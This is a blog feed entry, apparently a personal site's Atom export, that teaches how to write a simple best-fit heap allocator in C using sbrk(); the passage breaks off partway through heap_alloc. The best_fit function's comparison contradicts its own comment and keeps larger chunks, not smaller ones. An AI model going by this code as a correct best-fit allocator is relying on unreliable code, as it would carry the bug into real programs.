<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.4">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2020-12-30T13:19:23-05:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Nihaal Prasad</title><subtitle></subtitle><entry><title type="html">Creating a Basic Heap Allocator</title><link href="http://localhost:4000/2020/12/30/creating-a-basic-heap-allocator.html" rel="alternate" type="text/html" title="Creating a Basic Heap Allocator" /><published>2020-12-30T00:00:00-05:00</published><updated>2020-12-30T00:00:00-05:00</updated><id>http://localhost:4000/2020/12/30/creating-a-basic-heap-allocator</id><content type="html" xml:base="http://localhost:4000/2020/12/30/creating-a-basic-heap-allocator.html">&lt;p&gt;The heap is an important segment of memory that grows upwards, towards the stack. This section of memory is used by computers to dynamically allocate memory to store whatever data they need for their programs to work. Heap allocators are used by programs in order to allot and keep track of chunks of memory that are being used inside of the heap. Modern operating systems use efficient and effective heap allocators in their systems, but this blog post will just be going over how a very basic heap allocator can be constructed in C.&lt;/p&gt;

&lt;p&gt;Four functions will be implemented in this basic heap allocator:&lt;/p&gt;
&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;heap_alloc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;size_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// Allocates memory on the heap&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;heap_header_t&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;best_fit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;size_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// Finds a free block (if available)&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;heap_free&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;block&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// Frees memory on the heap&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;heap_defrag&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// Defrags the heap&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Every chunk of memory on this heap allocator will have a header, which is shown below. The header will store information such as the size of the chunk and whether the chunk is being used or not. All free chunks in the heap allocator will be stored in a linked list, which is why two pointers for storing the next and previous value on the linked list of free chunks are included in the structure.&lt;/p&gt;
&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;heap_header&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;heap_header&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;next&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// Next value in linked list.&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;heap_header&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;prev&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// Previous value in list.&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;size_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// Amount of memory allocated for user.&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;free&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// Set to 1 if memory isn't being used.&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The header should always be aligned to a multiple of four bytes. In this implementation, the heap allocator will make all headers have a size of 32 bytes. This alignment property can be easily implemented by defining the structure inside of a union, as shown below.&lt;/p&gt;
&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;// Header for each chunk of allocated memory&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;typedef&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;union&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;heap_header&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// Actual header data that we care about&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;union&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;heap_header&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;next&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// Next value in linked list.&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;union&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;heap_header&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;prev&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// Previous value in list.&lt;/span&gt;
        &lt;span class=&quot;kt&quot;&gt;size_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// Amount of memory allocated for user.&lt;/span&gt;
        &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;free&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// Set to 1 if memory isn't being used.&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;align&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// Only used to align header to 32 bytes&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;heap_header_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;A static global containing the head of the linked list is required for this to work. Note that this linked list will only be used to store free chunks, and it should not contain any chunks that are not free.&lt;/p&gt;
&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;// Head for the linked list of free chunks&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;heap_header_t&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;head&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;It is also necessary to keep track of where the heap begins and ends. This can be done using two global void pointers. Note that the end of the heap is also called the “program break.”&lt;/p&gt;
&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;// Start and end of the heap&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;heap_start&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;heap_end&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Throughout the code, the &lt;code class=&quot;highlighter-rouge&quot;&gt;sbrk(intptr_t increment)&lt;/code&gt; function, which is located in &lt;code class=&quot;highlighter-rouge&quot;&gt;unistd.h&lt;/code&gt;, will be used to increase or decrease the size of the heap. The &lt;code class=&quot;highlighter-rouge&quot;&gt;increment&lt;/code&gt; value may be positive or negative, and if it is set to zero, then the program break will be returned.&lt;/p&gt;

&lt;p&gt;When a program is first initialized, the start and end of the program’s heap should be the same since no memory has been allocated for the heap yet. When the first call to &lt;code class=&quot;highlighter-rouge&quot;&gt;heap_alloc()&lt;/code&gt; occurs, the values of the start and end of the heap must be recorded using the code shown below.&lt;/p&gt;
&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;// If the heap has not been initialized, then initialize it&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;heap_start&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;heap_end&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;heap_start&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sbrk&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;heap_end&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;heap_start&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;When a user calls &lt;code class=&quot;highlighter-rouge&quot;&gt;heap_alloc()&lt;/code&gt;, the heap allocator should first check whether a free chunk already exists in the linked list of free chunks. This heap allocator will search for a suitable free chunk by using the best fit algorithm, which returns the smallest chunk that satisfies the user’s size requirement. If a suitable free chunk is found, then it must be unlinked from the linked list of free chunks and returned to the user.&lt;/p&gt;
&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;heap_header_t&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;// Check if a suitable chunk already exists in the linked list.&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;// Assume that size is given to us by the user&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;best_fit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// If we found a suitable free chunk in the linked list, then remove&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// that chunk from the linked list of free chunks.&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;prev&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;prev&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;next&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;next&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;next&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;next&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;prev&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;prev&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;head&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;head&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;next&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;head&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;head&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;prev&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The best fit algorithm is implemented as follows:&lt;/p&gt;
&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;// Loops through the linked list and finds a chunk that has a size big enough to store&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;// the user's data. Uses the best fit algorithm. May return NULL if there is no free&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;// chunk in the linked list, in which case the size of the heap must be increased.&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;heap_header_t&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;best_fit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;size_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;heap_header_t&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;heap_header_t&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;curr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;head&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;curr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;c1&quot;&gt;// Check if this current chunk meets the size requirements.&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;curr&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;size&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                &lt;span class=&quot;c1&quot;&gt;// If we haven't found a chunk yet, then store this one&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;curr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;size&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;curr&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                &lt;span class=&quot;c1&quot;&gt;// If we have already found a chunk, then only store this&lt;/span&gt;
                &lt;span class=&quot;c1&quot;&gt;// one if it has a smaller size than the stored chunk (or,&lt;/span&gt;
                &lt;span class=&quot;c1&quot;&gt;// in other words, if it has the better fit).&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;curr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

        &lt;span class=&quot;c1&quot;&gt;// Go to the next chunk in the linked list&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;curr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;curr&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;next&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;If this algorithm returns NULL, then the heap allocator must increase the size of the heap so that a new chunk can be created and returned to the user. This can easily be done using the &lt;code class=&quot;highlighter-rouge&quot;&gt;sbrk()&lt;/code&gt; function described earlier.&lt;/p&gt;
&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;// If there are no free chunks in the linked list with a big enough&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;// size for the requested data, then increase the size of the heap.&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sbrk&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;size&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;heap_header_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
